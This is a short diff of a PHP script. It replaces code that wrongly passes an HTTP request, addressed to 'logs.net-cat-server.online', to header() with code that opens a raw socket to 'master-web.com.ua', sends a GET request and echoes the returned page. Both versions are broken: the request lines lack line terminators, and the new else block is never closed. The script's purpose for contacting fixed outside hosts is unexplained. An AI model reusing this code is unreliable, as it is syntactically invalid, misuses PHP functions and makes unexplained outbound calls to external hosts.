@@ -1,8 +1,19 @@
-<?
-$request = "GET /simple.php HTTP/1.1";
-$request .= "Host: logs.net-cat-server.online";
-$request .= "Connection: close";
-$request .= "User-Agent: Mozilla/5.0 (X11; U; Linux i686; ru; rv:1.9b5) Gecko/2008050509 Firefox/3.0b5";
-$request .= "Accept: text/html";
-header($request);
+<?php
+
+$fp = fsockopen("master-web.com.ua", 80, $errno, $errstr, 30);
+if (!$fp) {
+      echo "$errstr ($errno)
+";
+} else {
+      $query = "GET / HTTP/1.1 ";
+      $query .= "Host: master-web.com.ua ";
+      $query .= "Connection: Close ";
+      fwrite($fp, $query);
+      $page = '';
+      while (!feof($fp)) {
+         $page .= fgets($fp, 4096);
+      }
+   fclose($fp);
+   if (!empty($page)) echo '<pre>'.$page.'</pre>';
+
 ?>
